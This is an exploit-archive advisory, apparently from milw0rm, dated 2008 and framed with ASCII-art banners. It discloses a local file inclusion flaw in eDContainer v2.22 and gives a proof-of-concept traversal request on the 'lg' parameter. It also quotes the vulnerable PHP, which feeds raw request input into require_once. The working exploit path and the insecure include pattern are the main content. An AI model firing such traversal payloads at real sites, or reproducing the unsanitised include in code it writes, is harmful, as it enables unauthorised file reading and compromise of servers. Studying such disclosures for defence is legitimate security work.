@@ -1,0 +1,26 @@
+ _____   ____   __   __     _       ____        ____    ____ 
+|_   _| |  _ \  \ \ / /    / \     / ___|      / ___|  / ___|
+  | |   | |_) |  \ V /    / _ \   | |  _      | |     | |    
+  | |   |  _ <    | |    / ___ \  | |_| |  _  | |___  | |___ 
+  |_|   |_| \_\   |_|   /_/   \_\  \____| (_)  \____|  \____|
+
+
+
+eDContainer v2.22 (lg) Local File Inclusion Vulnerability
+Script : http://www.mirrorservice.org/sites/download.sourceforge.net/pub/sourceforge/e/ed/edscontacts/eDContainer_v222.zip
+Poc : /index.php?lg=../../../../index
+Vuln Code :
+File index.php
+
+if ( isset($_REQUEST['lg']) ) { $INDEX['currentLanguage'] = $_REQUEST['lg']; } else if ( !isset( $INDEX['currentLanguage'] ) ) { 
+ 	$INDEX['currentLanguage']  = $CONFIG['language']['default'];
+}
+require_once 'myContents_'.$INDEX['currentLanguage'].'.php';
+        ____           _           _           __  __ 
+       / ___|   ___   | |       __| |         |  \/  |
+      | |  _   / _ \  | |      / _` |         | |\/| |
+      | |_| | | (_) | | |___  | (_| |         | |  | |
+       \____|  \___/  |_____|  \__,_|  _____  |_|  |_|
+                                      |_____|         
+
+# milw0rm.com [2008-12-29]
